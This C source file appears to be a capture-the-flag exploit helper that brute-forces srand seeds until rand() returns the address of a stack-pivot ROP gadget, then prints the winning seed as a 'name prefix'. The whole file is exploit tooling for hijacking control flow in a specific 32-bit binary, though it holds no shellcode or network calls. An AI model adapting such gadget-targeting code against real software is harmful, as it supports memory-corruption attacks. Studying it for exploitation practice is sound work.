// gcc -o bf -O2 bf.c
#include <stdio.h>
#include <stdlib.h>

// pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;
int targets[] = {
    0x080507b6,
    0x0805086d,
    0x08057240,
    0x08057589,
    0x0805765a,
    0x0805b701,
    0x0805c621,
    0x08073560,
    0x0807398b,
    0x08073c16,
    0x08073e8c,
    0x0807435e,
    0x0807459e,
    0x08078427,
    0x08078630,
    0x080a504c,
    0x080a77b1,
    0x080a7e61,
    0x080ae65e,
    0x080ae779,
    0x080bda0a,
    0x080be560,
    0
};

int main() {
    FILE *fp;
    fp = fopen("/dev/urandom", "r");

    unsigned char buf[4];
    while (1) {
        fread(&buf, 1, 4, fp);
        srand(*(int*)buf);

        int i;
        for (i = 1; i <= 100000; i++) {
            int t = rand();
            int j = 0;
            for (j = 0; targets[j]; j++) {
                if (targets[j] == t) {
                    break;
                }
            }

            if (targets[j]) {
                printf("name prefix: %02x%02x%02x%02x\n", buf[0], buf[1], buf[2], buf[3]);
                printf("%d rand() call is 0x%08x\n", i, targets[j]);
                break;
            }
        }
    }
    fclose(fp);

    return 0;
}
